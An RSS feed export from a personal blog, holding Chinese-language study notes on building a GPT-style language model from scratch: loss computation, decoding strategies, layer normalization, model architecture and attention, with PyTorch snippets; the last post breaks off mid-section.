<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:version="2.0"><channel><title>TanKimzeg&apos;s Blog</title><description>TanKimzeg&apos;s personal blog, sharing insights on technology, programming, and life experiences.</description><link>https://tankimzeg.top/</link><language>en</language><item><title>在无标记的数据集上进行预训练 | LLM</title><link>https://tankimzeg.top/blog/llm/ch5_gpt-pretrain/</link><guid isPermaLink="true">https://tankimzeg.top/blog/llm/ch5_gpt-pretrain/</guid><description>从零构建大语言模型第5章:本章对上一章实现的GPT模块进行预训练,最后加载GPT-2的预训练权重</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/llm/ch5_gpt-pretrain/&quot;&gt;https://tankimzeg.top/blog/llm/ch5_gpt-pretrain/&lt;/a&gt;&lt;/blockquote&gt; &lt;p&gt;本章的核心是实现训练函数对LLM进行预训练&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://skindhu.github.io/Build-A-Large-Language-Model-CN/Image/chapter5/figure5.1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2&gt;文本损失值的计算&lt;/h2&gt;
&lt;p&gt;从输入文本到 LLM 生成文本的整体流程，该流程通过五个步骤实现。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://skindhu.github.io/Build-A-Large-Language-Model-CN/Image/chapter5/figure5.4.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;在上一章中我们可以看到,模型生成的文本与目标文本不同,因为它尚未训练.接下来,通过&amp;quot;损失来数值化评估模型生成文本的质量.这不仅有助于衡量生成文本的质量，还为实现训练函数提供了基础，训练函数主要通过更新模型权重来改善生成文本的质量。&lt;/p&gt;
&lt;p&gt;文本评估过程的一部分是衡量生成的 token 与正确预测目标之间的差距。本章后面实现的训练函数将利用这些信息来调整模型权重，使生成的文本更接近（或理想情况下完全匹配）目标文本。&lt;/p&gt;
&lt;p&gt;也就是说要提高正确目标token ID所在位置的softmax概率.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;反向传播&lt;/strong&gt;:如何最大化目标token的softmax值?整体思路是通过更新模型权重.权重更新通过一种称为反向传播的过程来实现，这是一种训练深度神经网络的标准技术.
反向传播需要一个损失函数，该函数用于计算模型预测输出与实际目标输出之间的差异（此处指与目标 token ID 对应的概率）。这个损失函数用于衡量模型预测与目标值的偏差程度。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;交叉熵损失函数:&lt;/p&gt;
&lt;p&gt;$$Loss=-\sum_{t=1}^{T}\ln P(y_{t}|x,\theta)$$
其中:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;$T$是序列长度&lt;/li&gt;
&lt;li&gt;$y_{t}$是在位置t上的目标token&lt;/li&gt;
&lt;li&gt;$P(y_{t}|x,\theta)$是模型在参数$\theta$下对目标token $y_{t}$的条件概率&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;使用对数可以避免&lt;strong&gt;数值下溢&lt;/strong&gt;.概率值同时发生需要相乘,但是越乘越接近0.取对数就越来越大,符合损失越大的直观感受.&lt;/p&gt;
&lt;p&gt;Pytorch内置&lt;code&gt;cross_entropy&lt;/code&gt;函数.在使用它之前,需要先将张量展平:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;logits_flat = logits.flatten(0, 1)
targets_flat = targets.flatten()
print(&amp;quot;Flattened logits:&amp;quot;, logits_flat.shape)
print(&amp;quot;Flattened targets:&amp;quot;, targets_flat.shape)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;得到的张量维度如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;Flattened logits: torch.Size([6, 50257])
Flattened targets: torch.Size([6])
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;最后计算交叉熵损失:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;loss = torch.nn.functional.cross_entropy(logits_flat, targets_flat)
print(loss)
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;计算训练集和验证集的损失&lt;/h2&gt;
&lt;p&gt;我们使用一个非常小的文本数据集，即伊迪丝·华顿的短篇小说《判决》.&lt;/p&gt;
&lt;p&gt;将数据集分割为训练集(train loader)和验证集(validation loader).&lt;/p&gt;
&lt;p&gt;制作Dataloader后,取出批次分别计算损失值,再计算所有批次的平均损失,得到训练集和验证集的损失值.&lt;/p&gt;
&lt;h2&gt;训练LLM&lt;/h2&gt;
&lt;p&gt;重点采用一种简单的训练循环方式来保证代码简洁易读&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://skindhu.github.io/Build-A-Large-Language-Model-CN/Image/chapter5/figure5.11.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2&gt;通过解码策略控制生成结果的随机性&lt;/h2&gt;
&lt;p&gt;前一章中的 &lt;code&gt;generate_text_simple&lt;/code&gt; 函数,选取词汇表中得分最高的token作为生成的token.接下来介绍两种控制生成文本随机性的和多样性的方法: &lt;code&gt;temperature scaling&lt;/code&gt; 和 &lt;code&gt;top-k sampling&lt;/code&gt;.&lt;/p&gt;
&lt;h3&gt;Temperature scaling&lt;/h3&gt;
&lt;p&gt;在生成下一个词时加入概率选择.
之前的&lt;code&gt;torch.argmax&lt;/code&gt;选择概率最高的token作为下一个词,这也叫贪心解码.为了生成更加多样化的文本,可以将 &lt;code&gt;argmax&lt;/code&gt; 替换为一种从概率分布中进行采样的函数: &lt;code&gt;torch.multinomial&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;我们可以通过一种称为&lt;code&gt;temperature scaling&lt;/code&gt;的方法进一步控制分布和选择过程，所谓&lt;code&gt;temperature scaling&lt;/code&gt;，其实就是将 logits 除以一个大于 0 的数.&lt;/p&gt;
&lt;p&gt;当 temperature 设置为小于1时，生成的分布会更加尖锐; 反之,生成的分布更接近均匀分布.这是因为指数函数的形状.放大后,大数较小数的差异更大,缩小后大数较小数的差异变小.&lt;/p&gt;
&lt;p&gt;$$P(x_{i})=\frac{\exp\left( \frac{z_{i}}{T} \right)}{\sum \exp(\frac{z_{j}}{T})}$$&lt;/p&gt;
&lt;h3&gt;Top-k采样&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;temperature scaling&lt;/code&gt;的概率采样方法有时会导致生成语法不正确或完全不合逻辑的内容.&lt;/p&gt;
&lt;p&gt;我们引入了另一种称为&lt;code&gt;top-k 采样&lt;/code&gt;的概念，当与概率采样和&lt;code&gt;temperature scaling&lt;/code&gt;结合使用时，可以提升文本生成效果。&lt;/p&gt;
&lt;p&gt;在 top-k 采样中，我们可以将采样限制在最有可能的前 k 个 token 内，并通过将其他 token 的概率设为零，将它们排除在选择之外.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://skindhu.github.io/Build-A-Large-Language-Model-CN/Image/chapter5/figure5.15.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;实现top-k过程,首先选出最大的三个token:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;top_k = 3
top_logits, top_pos = torch.topk(next_token_logits, top_k)
print(&amp;quot;Top logits:&amp;quot;, top_logits)
print(&amp;quot;Top positions:&amp;quot;, top_pos)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我们应用Pytorch的 &lt;code&gt;torch.where&lt;/code&gt; 函数,将非top-3的token的logit值设为-inf:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;new_logits = torch.where(
    condition=next_token_logits &amp;lt; top_logits[-1],   #A
    input=torch.tensor(float(&amp;#39;-inf&amp;#39;)),              #B
    other=next_token_logits                         #C
)
print(new_logits)

#A 识别出小于 top 3 最小值的 logits
#B 将这些较小的 logits 赋值为负无穷大
#C 保留所有其他 token 的原始 logits
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我们现在可以应用&lt;code&gt;temperature scaling&lt;/code&gt; 和&lt;code&gt;multinomial&lt;/code&gt;函数来进行概率采样，从这 3 个非零概率得分中选择下一个 token。&lt;/p&gt;
&lt;h3&gt;对文本生成函数进行调整&lt;/h3&gt;
&lt;p&gt;整合以上方法,编写新的&lt;code&gt;generate&lt;/code&gt;函数&lt;/p&gt;
&lt;h2&gt;在Pytorch中加载和保存模型权重&lt;/h2&gt;
&lt;p&gt;保存模型:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;torch.save(model.state_dict(), &amp;quot;model.pth&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;加载模型权重:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;model = GPTModel(GPT_CONFIG_124M)
model.load_state_dict(torch.load(&amp;quot;model.pth&amp;quot;))
model.eval()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在推理阶段，我们不希望随机丢弃网络中学到的任何信息。通过使用 &lt;code&gt;model.eval()&lt;/code&gt;，模型会切换到推理阶段的评估模式，从而禁用 dropout 层。&lt;/p&gt;
&lt;p&gt;如果计划继续训练模型,那么建议同时保存优化器状态&lt;/p&gt;
&lt;p&gt;AdamW 等自适应优化器会为每个模型参数存储额外信息。AdamW 使用历史数据动态调整每个模型参数的学习率。没有这些信息时，优化器会重置，模型可能无法有效学习，甚至无法正确收敛，进而失去生成连贯文本的能力。可以使用 &lt;code&gt;torch.save&lt;/code&gt; 保存模型和优化器的状态，方法如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;torch.save({
    &amp;quot;model_state_dict&amp;quot;: model.state_dict(),
    &amp;quot;optimizer_state_dict&amp;quot;: optimizer.state_dict(),
    },
    &amp;quot;model_and_optimizer.pth&amp;quot;
)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;接下来，我们可以按以下步骤恢复模型和优化器的状态：首先通过 &lt;code&gt;torch.load&lt;/code&gt; 加载保存的数据，然后使用 &lt;code&gt;load_state_dict&lt;/code&gt; 方法恢复状态：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;checkpoint = torch.load(&amp;quot;model_and_optimizer.pth&amp;quot;)
model = GPTModel(GPT_CONFIG_124M)
model.load_state_dict(checkpoint[&amp;quot;model_state_dict&amp;quot;])
optimizer = torch.optim.AdamW(model.parameters(), lr=5e-4, weight_decay=0.1)
optimizer.load_state_dict(checkpoint[&amp;quot;optimizer_state_dict&amp;quot;])
model.train();
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;从OpenAI加载预训练权重&lt;/h2&gt;
&lt;p&gt;OpenAI 公开了 GPT-2 模型的权重，使我们不必投入数十万甚至数百万美元自行在大规模语料上重新训练模型。&lt;/p&gt;
&lt;p&gt;OpenAI提供了多种规模的模型权重.包括124M,355M,744M和1558M.不同大小的GPT-2模型在总体架构上保持一致,但注意力头和Transformer模块等组件的重复次数以及嵌入维度大小有所不同.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://skindhu.github.io/Build-A-Large-Language-Model-CN/Image/chapter5/figure5.17.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;OpenAI 在多头注意力模块的线性层中使用了偏置向量，以实现查询（query）、键（key）和值（value）矩阵的计算。偏置向量在现代 LLM 中已不再常用，因为它们对提升模型性能没有帮助，因而不再必要。然而，由于我们使用的是预训练权重，为了保持一致性，仍需启用这些偏置向量.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;torch.manual_seed(123)
token_ids = generate(
    model=gpt,
    idx=text_to_token_ids(&amp;quot;Every effort moves you&amp;quot;, tokenizer),
    max_new_tokens=25,
    context_size=NEW_CONFIG[&amp;quot;context_length&amp;quot;],
    top_k=50,
    temperature=1.5
)
print(&amp;quot;Output text:\n&amp;quot;, token_ids_to_text(token_ids, tokenizer))
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;模型加载成功.通过设置不同的seed,temperature,top_k,可以输出不同的文本,temperature越大,文本变得莫名其妙.&lt;/p&gt;
&lt;/blockquote&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Wed, 24 Sep 2025 16:00:00 GMT</pubDate></item><item><title>从零开始实现一个用于文本生成的GPT模型 | LLM</title><link>https://tankimzeg.top/blog/llm/ch4_gpt-model/</link><guid isPermaLink="true">https://tankimzeg.top/blog/llm/ch4_gpt-model/</guid><description>从零构建大语言模型第4章:本章实现了Transformer模块,进一步实现了GPT模型</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/llm/ch4_gpt-model/&quot;&gt;https://tankimzeg.top/blog/llm/ch4_gpt-model/&lt;/a&gt;&lt;/blockquote&gt; &lt;p&gt;&lt;img src=&quot;https://skindhu.github.io/Build-A-Large-Language-Model-CN/Image/chapter4/figure4.1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2&gt;实现LLM的架构&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://skindhu.github.io/Build-A-Large-Language-Model-CN/Image/chapter4/figure4.2.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;torch.manual_seed(123)
model = DummyGPTModel(GPT_CONFIG_124M)
logits = model(batch)
print(&amp;quot;Output shape:&amp;quot;, logits.shape)
print(logits)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;模型的输出通常被称为logits,它的形状是[batch,text_len,vocab_size].嵌入层的维度为 50,257，因为每个维度对应词汇表中的一个唯一 token。在之后的处理中，我们会将这些 50,257 维向量转换回 token ID，然后再解码成单词。&lt;/p&gt;
&lt;h2&gt;使用LayerNorm对激活值进行标准化&lt;/h2&gt;
&lt;p&gt;本节中，我们将实现层归一化，以提高神经网络训练的稳定性和效率。&lt;/p&gt;
&lt;h3&gt;LayerNorm的工作原理&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://skindhu.github.io/Build-A-Large-Language-Model-CN/Image/chapter4/figure4.5.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;神经网络层包含一个线性层，后接一个非线性激活函数 ReLU，这是神经网络中的标准激活函数。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;torch.manual_seed(123)
batch_example = torch.randn(2, 5)          #A
layer = nn.Sequential(nn.Linear(5, 6), nn.ReLU())
out = layer(batch_example)
print(out)

#A 创建2个训练样本，每个样本有5个维度（特征）
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;实现层归一化，以提高神经网络训练的稳定性和效率。改操作包括减去均值,并除以标准差.&lt;/p&gt;
&lt;p&gt;现在将这个过程封装到一个Pytorch模块中,以便后续使用:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;# Listing 4.2 A layer normalization class
class LayerNorm(nn.Module):
    def __init__(self, emb_dim):
        super().__init__()
        self.eps = 1e-5
        self.scale = nn.Parameter(torch.ones(emb_dim))
        self.shift = nn.Parameter(torch.zeros(emb_dim))

    def forward(self, x):
        mean = x.mean(dim=-1, keepdim=True)
        var = x.var(dim=-1, keepdim=True, unbiased=False)
        norm_x = (x - mean) / torch.sqrt(var + self.eps)
        return self.scale * norm_x + self.shift
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;实现带有GELU激活函数的前馈神经网络&lt;/h2&gt;
&lt;p&gt;实现一个小型神经网络子模块&lt;/p&gt;
&lt;p&gt; &lt;code&gt;GELU(x) = x ⋅ Φ(x)&lt;/code&gt;，其中 Φ(x) 是标准正态分布的原函数。计算开销更低的近似实现:&lt;/p&gt;
&lt;p&gt;$$GELU(x)≈0.5⋅x⋅(1+tanh[(2/π)​⋅(x+0.044715⋅x3])$$&lt;/p&gt;
&lt;p&gt;使用 GELU 激活函数实现一个小型的神经网络模块 FeedForward:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;# Listing 4.4 A feed forward neural network module
class FeedForward(nn.Module):
    def __init__(self, cfg):
        super().__init__()
        self.layers = nn.Sequential(
            nn.Linear(cfg[&amp;quot;emb_dim&amp;quot;], 4 * cfg[&amp;quot;emb_dim&amp;quot;]),
            GELU(),
            nn.Linear(4 * cfg[&amp;quot;emb_dim&amp;quot;], cfg[&amp;quot;emb_dim&amp;quot;]),
        )

def forward(self, x):
    return self.layers(x)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://skindhu.github.io/Build-A-Large-Language-Model-CN/Image/chapter4/figure4.9.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;输出的张量形状与输入张量形状相同.&lt;/p&gt;
&lt;p&gt;FeedForward模块对模型的泛化能力起到了关键作用.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;尽管该模块的输入和输出维度相同，但在内部，它首先通过第一个线性层将嵌入维度扩展到一个更高维度的空间。之后再接入非线性 GELU 激活，最后再通过第二个线性层变换回原始维度。这样的设计能够探索更丰富的表示空间。扩展后的高维空间可以让模型“看到”输入数据中更多的隐藏特征，提取出更丰富的信息。然后在收缩回低维度时，这些丰富的特征被整合到了输入的原始维度表示中，使模型最终的输出包含更多的上下文和信息。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;[!note]
主观设计的产物.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;添加残差连接&lt;/h2&gt;
&lt;p&gt;快捷连接最初是在计算机视觉中的深度网络（尤其是残差网络）提出的，用于缓解梯度消失问题。梯度消失是指在训练中指导权重更新的梯度在反向传播过程中逐渐减小，导致早期层（靠近输入端的网络层）难以有效训练&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://skindhu.github.io/Build-A-Large-Language-Model-CN/Image/chapter4/figure4.12.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;[!note]
如何理解梯度消失现象?为什么有这种问题?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;快捷连接可以通过将某一层的输出直接传递给更深层来跳过==&lt;strong&gt;一个或多个&lt;/strong&gt;==层，有助于缓解深度神经网络训练中的梯度消失问题。&lt;/p&gt;
&lt;h2&gt;连接注意力层与线性层(Transformer模块)&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://skindhu.github.io/Build-A-Large-Language-Model-CN/Image/chapter4/figure4.13.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;Transformer 模块的输出维度与输入维度保持一致.&lt;/p&gt;
&lt;h2&gt;实现GPT模型&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://skindhu.github.io/Build-A-Large-Language-Model-CN/Image/chapter4/figure4.15.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;在参数量为 1.24 亿的 GPT-2 模型中，该模块重复了 12 次，这一数量通过 &lt;code&gt;GPT_CONFIG_124M&lt;/code&gt; 配置字典中的&lt;code&gt;n_layers&lt;/code&gt;参数指定。在 GPT-2 最大的 15.42 亿参数模型中，Transformer 模块重复了 36 次。&lt;/p&gt;
&lt;p&gt;最后一个 Transformer 模块的输出会经过一个最终的LayerNorm步骤，然后进入线性输出层。该层将 Transformer 的输出映射到一个高维空间（在本例中为 50,257 维，对应于模型的词汇表大小），以预测序列中的下一个词。&lt;/p&gt;
&lt;h3&gt;分析模型规模&lt;/h3&gt;
&lt;h4&gt;参数数量&lt;/h4&gt;
&lt;p&gt;统计模型中参数张量的总参数量:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;total_params = sum(p.numel() for p in model.parameters())
print(f&amp;quot;Total number of parameters: {total_params:,}&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;输出如下:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Total number of parameters: 163,009,536
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;GPT 模型的参数量为 1.24 亿，但代码输出的实际参数量却是 1.63 亿，这是为什么呢？&lt;/p&gt;
&lt;p&gt;原因在于 GPT-2 架构中使用了一种称为‘权重共享’的概念，这意味着 GPT-2 架构将 token 嵌入层的权重复用于输出层。为了更好地理解这一点，我们可以来看一下在模型中初始化的 token 嵌入层和线性输出层的形状：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;print(&amp;quot;Token embedding layer shape:&amp;quot;, model.tok_emb.weight.shape)
print(&amp;quot;Output layer shape:&amp;quot;, model.out_head.weight.shape)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;从打印结果可以看到，这两层的权重形状相同：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Token embedding layer shape: torch.Size([50257, 768])
Output layer shape: torch.Size([50257, 768])
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;token 嵌入层和输出层的参数量很大，因为分词器词汇表中包含 50,257 个 token。这两层的作用都是在嵌入维度和词汇表大小之间映射.根据权重共享原则，我们可以从 GPT-2 模型的总参数量中去除输出层的参数量。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;total_params_gpt2 = total_params - sum(p.numel() for p in model.out_head.parameters())
print(f&amp;quot;Number of trainable parameters considering weight tying: {total_params_gpt2:,}&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;输出如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Number of trainable parameters considering weight tying: 124,412,160
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如我们所见，模型现在的参数量为 1.24 亿，与 GPT-2 原始模型的规模一致。&lt;/p&gt;
&lt;p&gt;权重共享能够减少模型的整体内存占用和计算复杂度。然而，根据我的经验，==分别使用独立的 token 嵌入层和输出层会使训练效果和模型性能更佳，因此在我们的 GPT 模型实现中，我们使用了独立的嵌入层和输出层。==现代大语言模型也是如此。&lt;/p&gt;
&lt;h4&gt;参数所需内存&lt;/h4&gt;
&lt;p&gt;假设每个参数为32位浮点数,占用4字节,我们得出模型总大小位621.83MB.&lt;/p&gt;
&lt;h2&gt;生成文本&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://skindhu.github.io/Build-A-Large-Language-Model-CN/Image/chapter4/figure4.16.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;给定输入上下文后,逐步生成文本.每次迭代中,输入上下文会不断拓展,是模型能够生成连贯且符合上下文的内容.&lt;/p&gt;
&lt;p&gt;模型每一步输出与词汇表大小相同的张量[context_size, vocab_size],表示下一个潜在的token.取出最后一个(即预测,形状为[1,vocab_size]),通过&lt;code&gt;softmax&lt;/code&gt;转换为概率分布.找到最高概率对应的索引,取得token ID.将token ID 解码回文本,从而得到下个token.这样就达到了目的.&lt;/p&gt;
&lt;p&gt;在实践中,我们会多次迭代这一过程,直到生成的token数量达到要求.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ch04/01_main-chapter-code/gpt.py&lt;/code&gt;的&lt;code&gt;generate_text_simple&lt;/code&gt;就是这一过程.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;其实&lt;code&gt;softmax&lt;/code&gt;函数和取最大值是重复的,因为&lt;code&gt;softmax&lt;/code&gt;单调.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;model.eval()&lt;/code&gt;方法会自动禁用训练时使用的随机组件&lt;code&gt;dropout()&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;目前的模型生成的是一些随机的内容,因为模型还没经过训
练,使用随机权重.&lt;/p&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Tue, 23 Sep 2025 16:00:00 GMT</pubDate></item><item><title>实现注意力机制 | LLM</title><link>https://tankimzeg.top/blog/llm/ch3_attention-machine/</link><guid isPermaLink="true">https://tankimzeg.top/blog/llm/ch3_attention-machine/</guid><description>从零构建大语言模型第3章:本章讲解注意力机制</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/llm/ch3_attention-machine/&quot;&gt;https://tankimzeg.top/blog/llm/ch3_attention-machine/&lt;/a&gt;&lt;/blockquote&gt; &lt;p&gt;&lt;img src=&quot;https://skindhu.github.io/Build-A-Large-Language-Model-CN/Image/chapter3/figure3.1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;本章我们将实现四种不同的注意力机制.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://skindhu.github.io/Build-A-Large-Language-Model-CN/Image/chapter3/figure3.2.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2&gt;长序列建模的问题&lt;/h2&gt;
&lt;h3&gt;循环神经网络(RNN)&lt;/h3&gt;
&lt;p&gt;在编码器-解码器架构的 RNN 网络中，输入文本被输入到编码器中，编码器按顺序处理文本内容。在每个步骤中，编码器会更新其隐状态（即隐藏层的内部值），试图在最终的隐状态中捕捉整个输入句子的含义，如图所示。随后，解码器使用该最终隐状态来开始逐词生成翻译句子。解码器在每一步也会更新其隐状态，用于携带生成下一个词所需的上下文信息。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://skindhu.github.io/Build-A-Large-Language-Model-CN/Image/chapter3/figure3.4.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;这里的关键思想在于，编码器部分将整个输入文本处理为==一个==隐藏状态（记忆单元）。解码器随后使用该隐藏状态生成输出.可以将这个隐藏状态视为一个嵌入向量.&lt;/p&gt;
&lt;p&gt;编码器-解码器架构的 RNN 的一个重大问题和限制在于，&lt;strong&gt;在解码阶段 RNN 无法直接访问编码器的早期隐藏状态&lt;/strong&gt;。因此，它只能依赖当前隐藏状态来封装所有相关信息。这种设计可能导致上下文信息的丢失，特别是在依赖关系较长的复杂句子中，这一问题尤为突出。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;RNN用最后一个隐藏层的信息进入解码器,它聚合了以前的所有编码信息,所有可能导致上下文信息的丢失,这点很好理解.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;正是这一缺点促成了注意力机制的设计.&lt;/p&gt;
&lt;h3&gt;注意力机制的解决方法&lt;/h3&gt;
&lt;p&gt;它的关键思想是&lt;strong&gt;在处理每个词时，不仅依赖于最后的隐藏状态，而是允许模型直接关注序列中的所有词&lt;/strong&gt;。这样，即使是较远的词也能在模型计算当前词的语义时直接参与。&lt;/p&gt;
&lt;h2&gt;通过注意力机制捕捉数据依赖关系&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://skindhu.github.io/Build-A-Large-Language-Model-CN/Image/chapter3/figure3.6.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2&gt;通过自注意力机制关注输入的不同部分&lt;/h2&gt;
&lt;h3&gt;一种不含可训练权重的简化自注意力机制&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://skindhu.github.io/Build-A-Large-Language-Model-CN/Image/chapter3/figure3.7.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;在自注意力机制中，上下文向量起着关键作用。它们的目的是通过整合序列中所有其他元素的信息（如同一个句子中的其他词），为输入序列中的每个元素创建丰富的表示.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://skindhu.github.io/Build-A-Large-Language-Model-CN/Image/chapter3/figure3.8.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;实现自注意力机制的第一步是计算中间值 &lt;strong&gt;ω&lt;/strong&gt;，即注意力得分.&lt;/p&gt;
&lt;p&gt;每个输入token会先通过权重矩阵$W$ 分别计算出它的Q,K,V三个向量:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Q向量（查询向量）&lt;/strong&gt;：查询向量代表了这个词在寻找相关信息时提出的问题&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;K向量（键向量）&lt;/strong&gt;：键向量代表了一个单词的特征，或者说是这个单词如何&amp;quot;展示&amp;quot;自己，以便其它单词可以与它进行匹配&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;V向量（值向量）&lt;/strong&gt;：值向量携带的是这个单词的具体信息，也就是当一个单词被&amp;quot;注意到&amp;quot;时，它提供给关注者的内容&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;具体生成Q、K、V向量的方式主要通过线性变换：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Q1 = W_Q * (E1 + Pos1)
K1 = W_K * (E1 + Pos1)
V1 = W_V * (E1 + Pos1)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;依次类推，为所有token生成&lt;code&gt;Q&lt;/code&gt;，&lt;code&gt;K&lt;/code&gt;，&lt;code&gt;V&lt;/code&gt;向量，其中&lt;code&gt;W_Q&lt;/code&gt;，&lt;code&gt;W_K&lt;/code&gt;和&lt;code&gt;W_V&lt;/code&gt;是Transformer训练出的权重（每一层不同）&lt;/p&gt;
&lt;p&gt;针对每一个目标token，Transformer会计算它的 &lt;code&gt;Q向量&lt;/code&gt; 与其它所有的token的 &lt;code&gt;K向量&lt;/code&gt; 的==点积==，以确定每个词对当前词的重要性（即注意力分数）&lt;/p&gt;
&lt;blockquote&gt;
